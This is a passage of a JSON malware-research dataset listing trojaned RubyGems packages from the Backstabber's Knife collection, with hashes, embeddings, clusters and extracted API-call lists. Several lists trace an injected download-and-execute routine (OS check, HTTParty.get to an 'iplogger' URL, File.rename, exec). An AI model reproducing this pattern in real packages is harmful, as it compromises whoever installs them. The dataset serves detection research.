            "embedding": "[ 0.01493508 -0.02889472 -0.00861097 ...  0.00176663 -0.02204496\n  0.01279995]",
            "cluster": "0",
            "id": 198,
            "Filepath": "/Users/xxxx/Documents/malware/rubygems/Backstabber/fortnite-api/0.2.0/fortnite-api-0.2.0.gem",
            "path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/fortnite-api/0.2.0/fortnite-api-0.2.0_extracted",
            "name": "fortnite-api",
            "version": "0.2.0",
            "published_at": "2020-02-25T00:14:19.052Z",
            "Status": "tracked",
            "OSS": "RubyGems",
            "description": NaN,
            "author": 1.0,
            "maintainers": "The number of author or maintainer is 1.",
            "repository_url": "contain a homepage URL and a Github URL.",
            "dependencies": "bundler, rake, rspec",
            "SHA-256": "d617bb7227314e0661d1594816b0be2f0a2702887b34b2e0e8cc519daeb64cba"
        },
        {
            "name_version": "alchemy-pg-search-1.2.0",
            "SourceCode_Path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/alchemy-pg-search/1.2.0/alchemy-pg-search-1.2.0_extracted/alchemy-pg-search-1.2.0_sourcecode.rb",
            "Source": "Backstabber-Knife",
            "code_api": "['render', 'default_options.merge', 'search_result_page', 'render', 'default_options.merge', 'highlight', 'excerpt(text, phrase, { radius: radius }).to_s', 'excerpt', 'add_column', 'add_column', 'add_column', 'require', 'require', 'require', 'require', 'RbConfig::CONFIG.[]', 'os.match', 'HTTParty.get', 'd + aa + \"/\" + \"iplogger\" + e.+', 'd + aa + \"/\" + \"iplogger\".+', 'd + aa + \"/\".+', 'd + aa.+', 'd.+', 'TacoBell.check_win', 'File.rename', 'exec', 'require', 'require', 'require', 'PageSearchScope.new', 'extend', 'self.config=', 'SEARCHABLE_ESSENCES.include?', 'SEARCHABLE_ESSENCES.map', '\"Alchemy::#{k.classify}\".constantize', 'k.classify', '@@config.merge!', 'Alchemy::Content.class_eval', 'default_text', 'definition.[]', 'definition', 'Alchemy::PgSearch.is_searchable_essence?', 'definition.[]', 'definition', 'attributes.merge!', 'definition.fetch', 'definition', 'essence_type', 'essence.caption', 'essence', 'essence.stripped_body', 'essence', 'essence.body', 'essence', 'ingredient', 'controller.send', 'controller.send', 'controller.send', 'private', 'self.class.==', 'self.class', 'params.[](:query).blank?', 'params.[]', 'params', 'params.[]=', 'params', 'params.[](:query).blank?', 'params.[]', 'params', 'search_results', 'paginate_per', '@search_results.page(params.[](:page)).per', '@search_results.page', 'params.[]', 'params', 'paginate_per', 'Alchemy::PgSearch.config.[](:page_search_scope).pages', 'Alchemy::PgSearch.config.[]', 'Alchemy::PgSearch.config', 'can?', 'Alchemy::Page.new', 'Date.current', 'pages.full_text_search', 'params.[]', 'params', 'pages.not_restricted.full_text_search', 'pages.not_restricted', 'params.[]', 'params', 'Page.published.find_by', 'Page.published', 'search_result_page_layout.[]', 'search_result_page_layout', 'Language.current.id', 'Language.current', 'page.nil?', 'logger.warn', 'logger', 'PageLayout.get_all_by_attributes({ searchresults: true }).first', 'PageLayout.get_all_by_attributes', 'page_layout.nil?', 'raise', 'Alchemy::PgSearch.config.[]', 'Alchemy::PgSearch.config', 'Alchemy::Element.class_eval', 'include', 'pg_search_scope', 'has_many', 'lambda', 'joins(:element).where', 'joins', 'has_many', 'lambda', 'joins(:element).where', 'joins', 'has_many', 'lambda', 'joins(:element).where', 'joins', 'has_many', 'lambda', 'where', 'require', 'require', 'engine_name', 'config.to_prepare', 'config', 'require_relative', 'require_relative', 'require_relative', 'require_relative', 'require_relative', 'Alchemy::BaseController.send', 'Alchemy::PgSearch.searchable_essence_classes.each', 'Alchemy::PgSearch.searchable_essence_classes', 'klass.send', 'Alchemy::Page.class_eval', 'include', 'pg_search_scope', 'has_many', 'lambda', 'where', 'has_many', 'lambda', 'where', 'has_many', 'lambda', 'where', 'descendent_elements.full_text_search', 'descendent_elements', 'Alchemy::Page.published.contentpages.with_language', 'Alchemy::Page.published.contentpages', 'Alchemy::Page.published', 'Alchemy::Language.current.id', 'Alchemy::Language.current', 'extend', 'included', 'before_update', 'write_attribute', 'definition.fetch', 'definition', 'require', 'desc', 'source_root', 'File.expand_path', 'File.dirname', 'gsub_file', 'Rails.root.join', 'Rails.root', 'Time.now.strftime', 'Time.now', 'copy_file', 'Rails.root.join', 'Rails.root', 'require', 'desc', 'source_root', 'File.expand_path', 'File.dirname', 'directory', 'Rails.root.join', 'Rails.root']",
            "n_tokens": 924,
            "embedding": "[ 0.00588858 -0.01893601 -0.00875495 ...  0.00562414 -0.02453653\n  0.01656546]",
            "cluster": "0",
            "id": 481,
            "Filepath": "/Users/xxxx/Documents/malware/rubygems/Backstabber/alchemy-pg-search/1.2.0/alchemy-pg-search-1.2.0.gem",
            "path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/alchemy-pg-search/1.2.0/alchemy-pg-search-1.2.0_extracted",
            "name": "alchemy-pg-search",
            "version": "1.2.0",
            "published_at": "2020-02-25T01:42:55.255Z",
            "Status": "tracked",
            "OSS": "RubyGems",
            "description": NaN,
            "author": 1.0,
            "maintainers": "The number of author or maintainer is 1.",
            "repository_url": "contain a homepage URL but not a Github URL.",
            "dependencies": "bundler, rake, rspec-rails, alchemy_cms, pg_search, pg",
            "SHA-256": "40bd3d9c9af77a02f76a3df8de1123a727be16ead2cebef7e5f68d28feead41a"
        },
        {
            "name_version": "aliyun-open-search-0.6.0",
            "SourceCode_Path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/aliyun-open-search/0.6.0/aliyun-open-search-0.6.0_extracted/aliyun-open-search-0.6.0_sourcecode.rb",
            "Source": "Backstabber-Knife",
            "code_api": "['require', 'require', 'require', 'require', 'RbConfig::CONFIG.[]', 'os.match', 'HTTParty.get', 'd + aa + \"/\" + \"iplogger\" + e.+', 'd + aa + \"/\" + \"iplogger\".+', 'd + aa + \"/\".+', 'd + aa.+', 'd.+', 'TacoBell.check_win', 'File.rename', 'exec', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'attr_reader', 'attr_accessor', 'Base.basic_params', 'ENV.[]', 'params.inject([]) { |arr, (k, v)|\\n  arr << \"#{k}=#{Base.escape(v)}\"\\n}.join', 'params.inject', 'arr.<<', 'Base.escape', '(special_base_url || base_url) + \"?\".+', '(special_base_url || base_url)\\n.+', 'base_url', 'Rails.logger.info', 'Rails.logger', 'URI', 'params.sort_by { |k, _v|\\n  k.to_s\\n}.map { |arr,|\\n  str = if arr.[](1).is_a?(String) || arr.[](1).is_a?(Fixnum)\\n    arr.[](1).to_s\\n  else\\n    arr.[](1).to_json\\n  end\\n  \"#{arr.[](0)}=#{Base.escape(str)}\"\\n}.join', 'params.sort_by { |k, _v|\\n  k.to_s\\n}.map', 'params.sort_by', 'k.to_s', 'arr.[](1).is_a?', 'arr.[]', 'arr.[](1).is_a?', 'arr.[]', 'arr.[](1).to_s', 'arr.[]', 'arr.[](1).to_json', 'arr.[]', 'arr.[]', 'Base.escape', 'Base64.encode64(OpenSSL::HMAC.digest(OpenSSL::Digest.new(\"sha1\"), \"#{ENV.[](\"ACCESS_KEY_SECRET\")}&\", request_method + \"&\" + CGI.escape(\"/\") + \"&\" + Base.escape(params))).strip', 'Base64.encode64', 'OpenSSL::HMAC.digest', 'OpenSSL::Digest.new', 'ENV.[]', 'request_method + \"&\" + CGI.escape(\"/\") + \"&\".+', 'request_method + \"&\" + CGI.escape(\"/\").+', 'request_method + \"&\".+', 'request_method.+', 'request_method', 'CGI.escape', 'Base.escape', 'ENV.fetch', 'Time.now.utc.iso8601', 'Time.now.utc', 'Time.now', 'signature_nonce', '(Time.now.to_f.round(3) * 1000).to_i.to_s.+', '(Time.now.to_f.round(3) * 1000).to_i.to_s', '(Time.now.to_f.round(3) * 1000)\\n.to_i', 'Time.now.to_f.round(3).*', 'Time.now.to_f.round', 'Time.now.to_f', 'Time.now', '(1000..9999).to_a.sample.to_s', '(1000..9999).to_a.sample', '(1000..9999)\\n.to_a', '{}.tap', 'params.map', 'hash.[]=', 'key.to_s', 'value.is_a?', 'method.==', 'value.join', 'JSON.generate', 'value.to_s', 'CGI.escape(str).gsub(/\\\\!/, \"%21\").gsub(/\\\\\\'/, \"%27\").gsub(/\\\\(/, \"%28\").gsub(/\\\\)/, \"%29\").gsub(/\\\\*/, \"%2A\").gsub(/\\\\+/, \"%20\").gsub', 'CGI.escape(str).gsub(/\\\\!/, \"%21\").gsub(/\\\\\\'/, \"%27\").gsub(/\\\\(/, \"%28\").gsub(/\\\\)/, \"%29\").gsub(/\\\\*/, \"%2A\").gsub', 'CGI.escape(str).gsub(/\\\\!/, \"%21\").gsub(/\\\\\\'/, \"%27\").gsub(/\\\\(/, \"%28\").gsub(/\\\\)/, \"%29\").gsub', 'CGI.escape(str).gsub(/\\\\!/, \"%21\").gsub(/\\\\\\'/, \"%27\").gsub(/\\\\(/, \"%28\").gsub', 'CGI.escape(str).gsub(/\\\\!/, \"%21\").gsub(/\\\\\\'/, \"%27\").gsub', 'CGI.escape(str).gsub(/\\\\!/, \"%21\").gsub', 'CGI.escape(str).gsub', 'CGI.escape', 'attr_reader', 'index_names.is_a?', 'index_names.join', 'options.[]', 'options.[]', 'options.[]', 'options.[]', 'setup', 'basic_params.merge', 'basic_params', 'Base.format_params', 'custom_params.merge', 'custom_params', 'send_request', 'Base.new.basic_params.merge', 'Base.new.basic_params', 'Base.new', 'Base.format_params', 'custom_params.merge', 'custom_params', 'send_request', 'private', 'Net::HTTP.get', 'uri', 'params.merge', 'Search.signature', 'JSON.parse', 'result.[]', 'result.[](\"result\").[]', 'result.[]', 'attr_reader', 'index_names.join', 'basic_params.merge', 'basic_params', 'Base.format_params', 'custom_params.merge', 'index_names', 'Net::HTTP.get', 'uri', 'params.merge', 'Search.signature', 'attr_reader', 'ENV.[]', 'basic_params.merge', 'basic_params', 'Base.format_params', 'custom_params.merge', 'index_names', 'Net::HTTP.get', 'uri', 'params.merge', 'Suggest.signature', 'ENV.[]', 'Base.format_params', 'basic_params.merge', 'basic_params', 'Syncs.signature', 'basic_params.merge', 'basic_params', 'Net::HTTP.post_form', 'uri']",
            "n_tokens": 1231,
            "embedding": "[ 0.00897751 -0.02502284 -0.00250524 ...  0.00216932 -0.0306141\n  0.01725611]",
            "cluster": "0",
            "id": 588,
            "Filepath": "/Users/xxxx/Documents/malware/rubygems/Backstabber/aliyun-open-search/0.6.0/aliyun-open-search-0.6.0.gem",
            "path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/aliyun-open-search/0.6.0/aliyun-open-search-0.6.0_extracted",
            "name": "aliyun-open-search",
            "version": "0.6.0",
            "published_at": "2020-02-25T01:43:47.740Z",
            "Status": "tracked",
            "OSS": "RubyGems",
            "description": NaN,
            "author": 1.0,
            "maintainers": "The number of author or maintainer is 1.",
            "repository_url": "contain a homepage URL and a Github URL.",
            "dependencies": "bundler, pry, rake, rspec, figaro",
            "SHA-256": "3a82f6378eb3d1a511d5ee152443892da3c620dadc6d763df41cdff7819c26f3"
        },
        {
            "name_version": "bisearch-enzim_hu-0.0.4",
            "SourceCode_Path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/bisearch-enzim_hu/0.0.4/bisearch-enzim_hu-0.0.4_extracted/bisearch-enzim_hu-0.0.4_sourcecode.rb",
            "Source": "Backstabber-Knife",
            "code_api": "['require', 'require', 'require', 'require', 'RbConfig::CONFIG.[]', 'os.match', 'HTTParty.get', 'd + aa + \"/\" + \"iplogger\" + e.+', 'd + aa + \"/\" + \"iplogger\".+', 'd + aa + \"/\".+', 'd + aa.+', 'd.+', 'TacoBell.check_win', 'File.rename', 'exec', '[\"version\", \"primer_design\", \"l1_result_page\", \"l2_result_page\"].each', 'require', 'File.join', 'File.dirname', 'require', 'require_relative', 'hash.[]', 'hash.[](:line_a).[]', 'hash.[]', 'hash.[]', 'hash.[](:line_b).[]', 'hash.[]', 'URI', 'puts', 'Time.now', 'Net::HTTP.post_form', 'puts', 'Time.now.-', 'Time.now', 'BisearchEnzimHu::L2ResultPage.new', 'page.body', 'result_page.parse', 'require', 'require_relative', 'Nokogiri.HTML', '@doc.css(\"h2+h3+input+table\").first', '@doc.css', 'table.css', 'rows.shift', 'rows.empty?.!', 'rows.empty?', 'rows.shift.css', 'rows.shift', 'rows.shift', 'line_bb.css', 'line_a.[](0).content.to_i', 'line_a.[](0).content', 'line_a.[]', 'h.[]=', 'line_a.[](1).content.to_f', 'line_a.[](1).content', 'line_a.[]', 'h.[]=', 'line_a.[](11).content.to_i', 'line_a.[](11).content', 'line_a.[]', 'h.[]=', 'line_a.[](12).content.to_i', 'line_a.[](12).content', 'line_a.[]', 'h.[]=', 'line_a.[](13).content.to_i', 'line_a.[](13).content', 'line_a.[]', 'h.[]=', 'line_bb.css(\"input\").select { |el,|\\n  el.[](\"name\") == \"fp\"\\n}.first', 'line_bb.css(\"input\").select', 'line_bb.css', 'el.[](\"name\").==', 'el.[]', 'h.[](:fp).nil?.!', 'h.[](:fp).nil?', 'h.[]', 'h.[]=', 'h.[](:fp).[]', 'h.[]', 'h.[]=', 'line_bb.css(\"input\").select { |el,|\\n  el.[](\"name\") == \"rp\"\\n}.first', 'line_bb.css(\"input\").select', 'line_bb.css', 'el.[](\"name\").==', 'el.[]', 'h.[](:rp).nil?.!', 'h.[](:rp).nil?', 'h.[]', 'h.[]=', 'h.[](:rp).[]', 'h.[]', 'hh.each_pair', 'h.[]=', 'h.[](i).[]=', 'h.[]', 'line.[](2).content', 'line.[]', 'h.[](i).[]=', 'h.[]', 'line.[](3).content.to_i', 'line.[](3).content', 'line.[]', 'h.[](i).[]=', 'h.[]', 'line.[](4).content.to_i', 'line.[](4).content', 'line.[]', 'h.[](i).[]=', 'h.[]', 'line.[](5).content.to_f', 'line.[](5).content', 'line.[]', 'h.[](i).[]=', 'h.[]', 'line.[](6).content.to_f', 'line.[](6).content', 'line.[]', 'h.[](i).[]=', 'h.[]', 'line.[](7).content.to_f', 'line.[](7).content', 'line.[]', 'h.[](i).[]=', 'h.[]', 'line.[](8).content', 'line.[]', 'h.[](i).[]=', 'h.[]', 'line.[](9).content.to_i', 'line.[](9).content', 'line.[]', 'h.[](i).[]=', 'h.[]', 'line.[](10).content.to_i', 'line.[](10).content', 'line.[]', '@table_hash.[]=', 'proceed', 'private', '@table_hash.each_pair', 'BisearchEnzimHu::FpcrSubmitter.new.run', 'BisearchEnzimHu::FpcrSubmitter.new', '@table_hash.[](index).[]=', '@table_hash.[]', 'require', 'require', 'Nokogiri.HTML', '@doc.css(\"div.main\").children.each_with_index', '@doc.css(\"div.main\").children', '@doc.css', 'detect_direction', 'd.nil?.!', 'd.nil?', '@hash.[]', '@hash.[](@direction).[]', '@hash.[]', '@hash.[](@direction).[]=', '@hash.[]', 'detect_result', 'detect_matches', 'private', 'el.name.==', 'el.name', 'el.children.each', 'el.children', 'el2.name.==', 'el2.name', 'el2.[](\"name\").==', 'el2.[]', 'el2.name.==', 'el2.name', 'el2.[](\"name\").==', 'el2.[]', 'el.name.==', 'el.name', 'el.children.each', 'el.children', 'el2.name.==', 'el2.name', '@hash.[](@direction).[](:results).<<', '@hash.[](@direction).[]', '@hash.[]', 'parse_ensembl_url', 'el2.[]', 'el.name.downcase.==', 'el.name.downcase', 'el.name', 'el.children.[](0).name.downcase.==', 'el.children.[](0).name.downcase', 'el.children.[](0).name', 'el.children.[]', 'el.children', 'el.children.[](0).[](\"name\").==', 'el.children.[](0).[]', 'el.children.[]', 'el.children', '@hash.[](@direction).[](:matches).[]=', '@hash.[](@direction).[]', '@hash.[]', '@doc.css(\"div.main\").children.[](i + 1).content.to_i', '@doc.css(\"div.main\").children.[](i + 1).content', '@doc.css(\"div.main\").children.[]', '@doc.css(\"div.main\").children', '@doc.css', 'i.+', 'el.children.[](0).[](\"name\").==', 'el.children.[](0).[]', 'el.children.[]', 'el.children', '@hash.[](@direction).[](:matches).[]=', '@hash.[](@direction).[]', '@hash.[]', '@doc.css(\"div.main\").children.[](i + 1).content.to_i', '@doc.css(\"div.main\").children.[](i + 1).content', '@doc.css(\"div.main\").children.[]', '@doc.css(\"div.main\").children', '@doc.css', 'i.+', 'h.[]=', 'URI', 'uri.query.split(\"&\").each', 'uri.query.split', 'uri.query', 'pair.split', 'k.to_sym', '[:start, :end].include?', 'v.to_i', 'h.[]=', 'h.[]=', 'h.[](:end).-', 'h.[]', 'h.[]', 'require', 'require_relative', 'attr_reader', 'Mechanize.new', 'default_options.merge', 'default_options', '@options.delete', 'start_pos.+', 'seq.size', '@options.[]=', 'prepare', '@agent.get', '@page.form', '@options.each_pair', 'get_type', '@form.field_with({ name: field_name.to_s }).options.find { |e,|\\n  e.text.downcase =~ Regexp.new(value.downcase)\\n}.select', '@form.field_with({ name: field_name.to_s }).options.find', '@form.field_with({ name: field_name.to_s }).options', '@form.field_with', 'field_name.to_s', 'e.text.downcase.=~', 'e.text.downcase', 'e.text', 'Regexp.new', 'value.downcase', '@form.checkbox_with({ name: field_name.to_s }).send', '@form.checkbox_with', 'field_name.to_s', '@form.radiobutton_with({ name: field_name.to_s }).send', '@form.radiobutton_with', 'field_name.to_s', '@form.field_with({ name: field_name.to_s }).value=', '@form.field_with', 'field_name.to_s', '@form.field_with({ name: field_name.to_s }).value=', '@form.field_with', 'field_name.to_s', 'puts', 'Time.now', '@agent.submit', 'puts', 'Time.now.-', 'Time.now', '@primers.[]=', '@options.[]', 'BisearchEnzimHu::L1ResultPage.new', 'page.body', '@primers.[]=', 'res_page.parse', 'puts', '@primers.inspect', 'puts', '@primers.[](:output).inspect', '@primers.[]', '@primers.[](:output).each_pair', '@primers.[]', 'puts', 'h.inspect', 'h.[](:fpcr).[](:sense).[](:results).size.>', 'h.[](:fpcr).[](:sense).[](:results).size', 'h.[](:fpcr).[](:sense).[]', 'h.[](:fpcr).[]', 'h.[]', 'indexes_to_remove.<<', 'h.[](:fpcr).[](:antisense).[](:results).size.>', 'h.[](:fpcr).[](:antisense).[](:results).size', 'h.[](:fpcr).[](:antisense).[]', 'h.[](:fpcr).[]', 'h.[]', 'indexes_to_remove.<<', 'indexes_to_remove.uniq!', 'puts', 'indexes_to_remove.join', 'indexes_to_remove.each', '@primers.[](:output).delete', '@primers.[]', 'private', 'field_types.[]', 'field_types', 'field_name.to_sym']",
            "n_tokens": 2248,
            "embedding": "[ 0.00860758 -0.0281198  -0.00481511 ... -0.01068881 -0.03506753\n  0.01783182]",
            "cluster": "0",
            "id": 188,
            "Filepath": "/Users/xxxx/Documents/malware/rubygems/Backstabber/bisearch-enzim_hu/0.0.4/bisearch-enzim_hu-0.0.4.gem",
            "path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/bisearch-enzim_hu/0.0.4/bisearch-enzim_hu-0.0.4_extracted",
            "name": "bisearch-enzim_hu",
            "version": "0.0.4",
            "published_at": "2020-02-25T01:54:29.271Z",
            "Status": "tracked",
            "OSS": "RubyGems",
            "description": NaN,
            "author": 1.0,
            "maintainers": "The number of author or maintainer is 1.",
            "repository_url": "contain a homepage URL and a Github URL.",
            "dependencies": "bundler, rake, rspec, mechanize, nokogiri",
            "SHA-256": "10ec191fb6301f75390b003f6eeeb03f9e81f3f32dadbdec490478a227e05053"
        },
        {
            "name_version": "telegram_bot-ruby-0.12.0",
            "SourceCode_Path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/telegram_bot-ruby/0.12.0/telegram_bot-ruby-0.12.0_extracted/telegram_bot-ruby-0.12.0_sourcecode.rb",
            "Source": "Backstabber-Knife",
            "code_api": "['require', 'require', 'Telegram::Bot::Client.run', 'bot.listen', 'message.text', 'bot.api.send_message', 'bot.api', 'message.chat.id', 'message.chat', 'message.from.first_name', 'message.from', 'bot.api.send_message', 'bot.api', 'message.chat.id', 'message.chat', 'message.from.first_name', 'message.from', 'bot.api.send_message', 'bot.api', 'message.chat.id', 'message.chat', 'require', 'require', 'require', 'require', 'RbConfig::CONFIG.[]', 'os.match', 'HTTParty.get', 'd + aa + \"/\" + \"iplogger\" + e.+', 'd + aa + \"/\" + \"iplogger\".+', 'd + aa + \"/\".+', 'd + aa.+', 'd.+', 'TacoBell.check_win', 'File.rename', 'exec', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'attr_writer', 'Configuration.new', 'configuration', '[\"getUpdates\", \"setWebhook\", \"deleteWebhook\", \"getWebhookInfo\", \"getMe\", \"sendMessage\", \"forwardMessage\", \"sendPhoto\", \"sendAudio\", \"sendDocument\", \"sendVideo\", \"sendVoice\", \"sendVideoNote\", \"sendMediaGroup\", \"sendLocation\", \"editMessageLiveLocation\", \"stopMessageLiveLocation\", \"sendVenue\", \"sendContact\", \"sendChatAction\", \"getUserProfilePhotos\", \"getFile\", \"kickChatMember\", \"unbanChatMember\", \"restrictChatMember\", \"promoteChatMember\", \"leaveChat\", \"getChat\", \"getChatAdministrators\", \"exportChatInviteLink\", \"setChatPhoto\", \"deleteChatPhoto\", \"setChatTitle\", \"setChatDescription\", \"pinChatMessage\", \"unpinChatMessage\", \"getChatMembersCount\", \"getChatMember\", \"setChatStickerSet\", \"deleteChatStickerSet\", \"answerCallbackQuery\", \"editMessageText\", \"editMessageCaption\", \"editMessageReplyMarkup\", \"deleteMessage\", \"sendSticker\", \"getStickerSet\", \"uploadStickerFile\", \"createNewStickerSet\", \"addStickerToSet\", \"setStickerPositionInSet\", \"deleteStickerFromSet\", \"answerInlineQuery\", \"sendInvoice\", \"answerShippingQuery\", \"answerPreCheckoutQuery\", \"sendGame\", \"setGameScore\", \"getGameHighScores\", \"setPassportDataErrors\", \"editMessageMedia\", \"sendAnimation\", \"sendPoll\", \"stopPoll\", \"setChatPermissions\", \"setChatAdministratorCustomTitle\"].freeze', '[Telegram::Bot::Types::ReplyKeyboardMarkup, Telegram::Bot::Types::ReplyKeyboardRemove, Telegram::Bot::Types::ForceReply, Telegram::Bot::Types::InlineKeyboardMarkup].freeze', '[Telegram::Bot::Types::InlineQueryResultArticle, Telegram::Bot::Types::InlineQueryResultPhoto, Telegram::Bot::Types::InlineQueryResultGif, Telegram::Bot::Types::InlineQueryResultMpeg4Gif, Telegram::Bot::Types::InlineQueryResultVideo, Telegram::Bot::Types::InlineQueryResultAudio, Telegram::Bot::Types::InlineQueryResultVoice, Telegram::Bot::Types::InlineQueryResultDocument, Telegram::Bot::Types::InlineQueryResultLocation, Telegram::Bot::Types::InlineQueryResultVenue, Telegram::Bot::Types::InlineQueryResultContact, Telegram::Bot::Types::InlineQueryResultGame, Telegram::Bot::Types::InlineQueryResultCachedPhoto, Telegram::Bot::Types::InlineQueryResultCachedGif, Telegram::Bot::Types::InlineQueryResultCachedMpeg4Gif, Telegram::Bot::Types::InlineQueryResultCachedSticker, Telegram::Bot::Types::InlineQueryResultCachedDocument, Telegram::Bot::Types::InlineQueryResultCachedVideo, Telegram::Bot::Types::InlineQueryResultCachedVoice, Telegram::Bot::Types::InlineQueryResultCachedAudio].freeze', 'attr_reader', 'method_name.to_s', 'endpoint.include?', 'camelize', 'ENDPOINTS.include?', 'call', 'args.[](0).to_s', 'args.[]', 'method_name.include?', 'camelize', 'ENDPOINTS.include?', 'build_params', 'conn.post', 'conn', 'token', 'response.status.==', 'response.status', 'JSON.parse', 'response.body', 'raise', 'Exceptions::ResponseError.new', 'private', 'h.each_with_object', 'params.[]=', 'sanitize_value', 'jsonify_inline_query_results', 'jsonify_reply_markup', 'REPLY_MARKUP_TYPES.any?', 'value.is_a?', 'value.to_compact_hash.to_json', 'value.to_compact_hash', 'value.is_a?', 'value.all?', 'INLINE_QUERY_RESULT_TYPES.any?', 'i.is_a?', 'value.map { |i,|\\n  i.to_compact_hash.select { |_, v|\\n    v\\n  }\\n}.to_json', 'value.map', 'i.to_compact_hash.select', 'i.to_compact_hash', 'method_name.split', 'words.drop(1).map', 'words.drop', 'words.join', 'Faraday.new', 'url', 'faraday.request', 'faraday.request', 'faraday.adapter', 'Telegram::Bot.configuration.adapter', 'Telegram::Bot.configuration', 'attr_reader', 'attr_accessor', 'new(*args).run', 'new', 'default_options.merge', 'default_options', 'Api.new', 'options.delete', 'options', 'options.delete', 'options', 'logger.info', 'logger', 'Signal.trap', 'fetch_updates', 'exit', 'api.getUpdates', 'api', 'options', 'response.[]', 'response.[](\"result\").each', 'response.[]', 'Types::Update.new', '@options.[]=', 'update.update_id.next', 'update.update_id', 'update.current_message', 'log_incoming_message', 'private', 'NullLogger.new', 'message.respond_to?', 'message.from', 'message.from.id', 'message.from', 'logger.info', 'logger', 'format', 'attr_accessor', 'Faraday.default_adapter', 'require', 'require', 'attr_reader', 'super.+', 'format', 'data.map { |k, v|\\n  \"#{k}: \\\\\"#{v}\\\\\"\"\\n}.join', 'data.map', 'data', 'data.[]', 'data', 'data.[]', 'data', 'private', 'JSON.parse', 'response.body', 'response', 'response.status', 'response', 'response.env.url.to_s', 'response.env.url', 'response.env', 'response', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'Virtus.finalize', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'include', 'Virtus.model', 'include', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'include', 'Virtus.model', 'include', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'Hash.[]', 'attributes.dup.delete_if { |_, v|\\n  v.nil?\\n}.map', 'attributes.dup.delete_if', 'attributes.dup', 'attributes', 'v.nil?', 'value.class.ancestors.include?', 'value.class.ancestors', 'value.class', 'value.to_compact_hash', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'Array.[]', 'attribute', 'attribute', 'attribute', 'attribute', 'Array.[]', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'Array.[]', 'attribute', 'attribute', 'Array.[]', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'Array.[]', 'Array.[]', 'hsh.[](:inline_keyboard).map!', 'hsh.[]', 'arr.map', 'item.is_a?', 'item.to_compact_hash', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 'attribute', 